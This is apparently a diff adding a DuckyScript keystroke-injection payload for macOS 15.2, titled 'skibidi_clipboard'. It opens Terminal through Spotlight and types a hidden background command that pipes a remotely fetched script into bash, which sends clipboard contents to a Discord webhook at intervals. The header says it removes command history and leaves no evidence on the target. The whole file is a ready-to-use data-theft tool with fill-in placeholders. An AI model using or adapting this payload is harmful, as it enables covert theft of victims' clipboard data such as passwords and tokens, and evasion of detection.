@@ -1,0 +1,38 @@
+REM Title:          skibidi_clipboard
+REM Author:         CyberArtemio
+REM Description:    Exfiltrate clipboard content periodically to Discord. Runs in less than 2 seconds
+REM                 and remove commands history to cover traces.
+REM                 Script is downloaded from remote server and executed directly without saving any
+REM                 evidence on the target.
+REM                 Usage: change values on line 26
+REM Version:        v1.0
+REM Target:         MacOS 15.2
+
+DELAY 500
+
+REM Launch spotlight. Use both combos old one and new one
+CTRL SPACE
+DELAY 200
+GUI SPACE
+
+DELAY 100
+
+STRING Termin
+ENTER
+
+DELAY 300
+
+REM ############################ CHANGE ME ################################
+STRING nohup curl -s <SCRIPT_SOURCE> | bash -s -- <DISCORD_WEBHOOK> <SLEEP_TIME> &>/dev/null &
+REM #######################################################################
+
+ENTER
+
+DELAY 100
+
+STRING disown && exit
+ENTER
+
+DELAY 100
+
+GUI q
